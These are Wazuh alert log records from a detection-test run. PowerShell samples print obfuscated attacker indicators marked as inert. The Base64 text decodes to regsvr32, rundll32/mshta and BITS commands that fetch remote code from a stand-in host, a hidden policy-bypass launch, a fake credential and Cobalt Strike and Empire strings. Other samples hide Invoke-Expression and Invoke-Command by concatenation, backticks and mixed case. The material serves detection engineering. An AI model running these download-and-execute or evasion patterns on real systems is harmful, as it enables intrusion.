{"timestamp":"2026-07-05T14:12:12.602+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":24,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253532.1345120","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.0912713Z","eventRecordID":"117586","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-014'; $scenario = 'regsvr32_string_clear_base64_literal_v1'; $encoded = 'cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AdQBwAGQAYQB0AGUAcwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGMAaABlAGMAawAuAHMAYwB0ACAAcwBjAHIAbwBiAGoALgBkAGwAbAA7ACAAcwBpAG0AdQBsAGEAdABlAGQAIABpAG4AZABpAGMAYQB0AG8AcgAgAG8AbgBsAHkA'; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: a12d9620-3220-4905-8bc4-3ecb7ec4f3c4\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-014'; $scenario = 'regsvr32_string_clear_base64_literal_v1'; $encoded = 'cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AdQBwAGQAYQB0AGUAcwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGMAaABlAGMAawAuAHMAYwB0ACAAcwBjAHIAbwBiAGoALgBkAGwAbAA7ACAAcwBpAG0AdQBsAGEAdABlAGQAIABpAG4AZABpAGMAYQB0AG8AcgAgAG8AbgBsAHkA'; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"a12d9620-3220-4905-8bc4-3ecb7ec4f3c4"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:12.637+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":25,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253532.1349108","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.2184640Z","eventRecordID":"117590","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-015'; $scenario = 'rundll32_string_clear_base64_literal_v1'; $encoded = 'cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAJwBcAC4ALgBcAG0AcwBoAHQAbQBsACwAUgB1AG4ASABUAE0ATABBAHAAcABsAGkAYwBhAHQAaQBvAG4AJwA7ACAAcwBpAG0AdQBsAGEAdABlAGQAIABpAG4AZABpAGMAYQB0AG8AcgAgAG8AbgBsAHkA'; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 11a465c7-e6d1-4ab8-a11b-9f151947b1c6\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-015'; $scenario = 'rundll32_string_clear_base64_literal_v1'; $encoded = 'cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAJwBcAC4ALgBcAG0AcwBoAHQAbQBsACwAUgB1AG4ASABUAE0ATABBAHAAcABsAGkAYwBhAHQAaQBvAG4AJwA7ACAAcwBpAG0AdQBsAGEAdABlAGQAIABpAG4AZABpAGMAYQB0AG8AcgAgAG8AbgBsAHkA'; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"11a465c7-e6d1-4ab8-a11b-9f151947b1c6"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:12.655+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":26,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253532.1352904","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.3459505Z","eventRecordID":"117592","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-016'; $scenario = 'bits_string_clear_base64_literal_v1'; $encoded = 'UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAaAB0AHQAcABzADoALwAvAHUAcABkAGEAdABlAHMALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBjAG8AbgB0AGUAbgB0AC4AdAB4AHQAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAFwAYwBvAG4AdABlAG4AdAAuAHQAeAB0ADsAIABzAGkAbQB1AGwAYQB0AGUAZAAgAGkAbgBkAGkAYwBhAHQAbwByACAAbwBuAGwAeQA='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: e1e2a0a3-0e69-44f0-9f36-1ea6c059c7ad\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-016'; $scenario = 'bits_string_clear_base64_literal_v1'; $encoded = 'UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAaAB0AHQAcABzADoALwAvAHUAcABkAGEAdABlAHMALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBjAG8AbgB0AGUAbgB0AC4AdAB4AHQAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAFwAYwBvAG4AdABlAG4AdAAuAHQAeAB0ADsAIABzAGkAbQB1AGwAYQB0AGUAZAAgAGkAbgBkAGkAYwBhAHQAbwByACAAbwBuAGwAeQA='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"e1e2a0a3-0e69-44f0-9f36-1ea6c059c7ad"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:13.558+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":27,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253533.1357372","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.4904701Z","eventRecordID":"117608","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-017'; $scenario = 'hidden_window_clear_base64_literal_v1'; $encoded = 'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQBcAHUAcABkAGEAdABlAC4AcABzADEAOwAgAHMAaQBtAHUAbABhAHQAZQBkACAAaQBuAGQAaQBjAGEAdABvAHIAIABvAG4AbAB5AA=='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: cf27c905-5e9c-40fc-a380-fb28a1dcce85\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-017'; $scenario = 'hidden_window_clear_base64_literal_v1'; $encoded = 'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQBcAHUAcABkAGEAdABlAC4AcABzADEAOwAgAHMAaQBtAHUAbABhAHQAZQBkACAAaQBuAGQAaQBjAGEAdABvAHIAIABvAG4AbAB5AA=='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"cf27c905-5e9c-40fc-a380-fb28a1dcce85"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:13.575+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":28,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253533.1361800","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.6262245Z","eventRecordID":"117609","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-018'; $scenario = 'fake_credential_string_clear_base64_literal_v1'; $encoded = 'dQBzAGUAcgA9AHMAdgBjAF8AYgBhAGMAawB1AHAAOwAgAHAAYQBzAHMAdwBvAHIAZAA9AEUAeABhAG0AcABsAGUAUABhAHMAcwB3AG8AcgBkADEAMgAzACEAOwAgAHQAYQByAGcAZQB0AD0AcwBoAGEAcgBlAHAAbwBpAG4AdAAuAGUAeABhAG0AcABsAGUALgBsAG8AYwBhAGwAOwAgAHMAaQBtAHUAbABhAHQAZQBkACAAaQBuAGQAaQBjAGEAdABvAHIAIABvAG4AbAB5AA=='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 66921585-085a-4f54-a626-624841d8072a\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-018'; $scenario = 'fake_credential_string_clear_base64_literal_v1'; $encoded = 'dQBzAGUAcgA9AHMAdgBjAF8AYgBhAGMAawB1AHAAOwAgAHAAYQBzAHMAdwBvAHIAZAA9AEUAeABhAG0AcABsAGUAUABhAHMAcwB3AG8AcgBkADEAMgAzACEAOwAgAHQAYQByAGcAZQB0AD0AcwBoAGEAcgBlAHAAbwBpAG4AdAAuAGUAeABhAG0AcABsAGUALgBsAG8AYwBhAGwAOwAgAHMAaQBtAHUAbABhAHQAZQBkACAAaQBuAGQAaQBjAGEAdABvAHIAIABvAG4AbAB5AA=='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"66921585-085a-4f54-a626-624841d8072a"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:13.583+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":29,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253533.1365880","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.7546825Z","eventRecordID":"117610","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-019'; $scenario = 'cobaltstrike_string_clear_base64_literal_v1'; $encoded = 'QwBvAGIAYQBsAHQAIABTAHQAcgBpAGsAZQAgAGIAZQBhAGMAbwBuACAAcAByAG8AZgBpAGwAZQAgAHMAdAByAGkAbgBnADoAIABHAEUAVAAgAC8AagBxAHUAZQByAHkALQAzAC4AMwAuADEALgBtAGkAbgAuAGoAcwAgAEgAbwBzAHQAIAB1AHAAZABhAHQAZQBzAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtADsAIABzAGkAbQB1AGwAYQB0AGUAZAAgAGkAbgBkAGkAYwBhAHQAbwByACAAbwBuAGwAeQA='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 6435f50c-6135-4ae3-8ed0-801e38c1b05f\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-019'; $scenario = 'cobaltstrike_string_clear_base64_literal_v1'; $encoded = 'QwBvAGIAYQBsAHQAIABTAHQAcgBpAGsAZQAgAGIAZQBhAGMAbwBuACAAcAByAG8AZgBpAGwAZQAgAHMAdAByAGkAbgBnADoAIABHAEUAVAAgAC8AagBxAHUAZQByAHkALQAzAC4AMwAuADEALgBtAGkAbgAuAGoAcwAgAEgAbwBzAHQAIAB1AHAAZABhAHQAZQBzAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtADsAIABzAGkAbQB1AGwAYQB0AGUAZAAgAGkAbgBkAGkAYwBhAHQAbwByACAAbwBuAGwAeQA='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"6435f50c-6135-4ae3-8ed0-801e38c1b05f"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:13.600+0200","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":30,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253533.1370028","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:12.8759684Z","eventRecordID":"117611","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-020'; $scenario = 'empire_string_clear_base64_literal_v1'; $encoded = 'RQBtAHAAaQByAGUAIABsAGEAdQBuAGMAaABlAHIAIABzAHQAeQBsAGUAIAB0AGUAeAB0ADoAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBuAG8AUAAgAC0AcwB0AGEAIAAtAHcAIAAxACAALQBlAG4AYwAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEASABNAEEAYQBRAEIAdABBAEgAVQBBAGIAQQBCAGgAQQBIAFEAQQBaAFEAQgBrAEEAQwBjAEEAOwAgAHMAaQBtAHUAbABhAHQAZQBkACAAaQBuAGQAaQBjAGEAdABvAHIAIABvAG4AbAB5AA=='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: a07677e1-2ff3-4e94-ae5f-049df88049f2\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-020'; $scenario = 'empire_string_clear_base64_literal_v1'; $encoded = 'RQBtAHAAaQByAGUAIABsAGEAdQBuAGMAaABlAHIAIABzAHQAeQBsAGUAIAB0AGUAeAB0ADoAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBuAG8AUAAgAC0AcwB0AGEAIAAtAHcAIAAxACAALQBlAG4AYwAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEASABNAEEAYQBRAEIAdABBAEgAVQBBAGIAQQBCAGgAQQBIAFEAQQBaAFEAQgBrAEEAQwBjAEEAOwAgAHMAaQBtAHUAbABhAHQAZQBkACAAaQBuAGQAaQBjAGEAdABvAHIAIABvAG4AbAB5AA=='; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded; Write-Output 'decoded text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"a07677e1-2ff3-4e94-ae5f-049df88049f2"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:13.655+0200","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":1,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253533.1374552","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:13.1192820Z","eventRecordID":"117617","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-022'; $scenario = 'iex_clear_string_concat_v1'; $indicator = 'Invoke-E' + 'xpressio' + 'n ''Write' + '-Output ' + 'simulate' + 'd'''; Write-Output $indicator; Write-Output 'reconstructed text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 179ae953-9312-427f-b06e-2174f1bbdc1a\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-022'; $scenario = 'iex_clear_string_concat_v1'; $indicator = 'Invoke-E' + 'xpressio' + 'n ''Write' + '-Output ' + 'simulate' + 'd'''; Write-Output $indicator; Write-Output 'reconstructed text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"179ae953-9312-427f-b06e-2174f1bbdc1a"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:14.846+0200","rule":{"level":4,"description":"Powershell executing process discovery","id":"91815","mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]},"firedtimes":11,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253534.1377446","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:14.0499779Z","eventRecordID":"117676","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-029'; $scenario = 'remote_command_clear_string_concat_v1'; $indicator = 'Invoke-Comman' + 'd -ComputerNa' + 'me WS-APP-01 ' + '-ScriptBlock ' + '{ Get-Process' + ' }'; Write-Output $indicator; Write-Output 'reconstructed text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 051440dd-652e-4ba7-8582-2f794dfe74f5\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-029'; $scenario = 'remote_command_clear_string_concat_v1'; $indicator = 'Invoke-Comman' + 'd -ComputerNa' + 'me WS-APP-01 ' + '-ScriptBlock ' + '{ Get-Process' + ' }'; Write-Output $indicator; Write-Output 'reconstructed text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"051440dd-652e-4ba7-8582-2f794dfe74f5"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:16.561+0200","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":2,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253536.1380418","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:15.6122336Z","eventRecordID":"117729","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-042'; $scenario = 'iex_clear_backtick_v1'; $indicator = 'Invoke-E`xpression ''Write-Output simulated'''; Write-Output $indicator; Write-Output 'backtick-obfuscated text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 715d2bd5-e46a-4a0f-9225-8fd2abb837df\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-042'; $scenario = 'iex_clear_backtick_v1'; $indicator = 'Invoke-E`xpression ''Write-Output simulated'''; Write-Output $indicator; Write-Output 'backtick-obfuscated text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"715d2bd5-e46a-4a0f-9225-8fd2abb837df"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:16.813+0200","rule":{"level":4,"description":"Powershell executing process discovery","id":"91815","mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]},"firedtimes":12,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253536.1383220","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:16.4762638Z","eventRecordID":"117753","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-049'; $scenario = 'remote_command_clear_backtick_v1'; $indicator = 'Invoke-`Command -ComputerName WS-APP-01 -ScriptBlock { Get-Process }'; Write-Output $indicator; Write-Output 'backtick-obfuscated text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 2f2f8de4-50e5-4545-9731-e3689ad054e6\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-049'; $scenario = 'remote_command_clear_backtick_v1'; $indicator = 'Invoke-`Command -ComputerName WS-APP-01 -ScriptBlock { Get-Process }'; Write-Output $indicator; Write-Output 'backtick-obfuscated text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"2f2f8de4-50e5-4545-9731-e3689ad054e6"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:18.715+0200","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":3,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253538.1386100","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:18.0367394Z","eventRecordID":"117800","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-062'; $scenario = 'iex_clear_mixed_case_v1'; $indicator = 'InVoKe-ExPrEsSiOn ''WrItE-oUtPuT sImUlAtEd'''; Write-Output $indicator; Write-Output 'mixed-case text is inert and not executed'; Write-Output 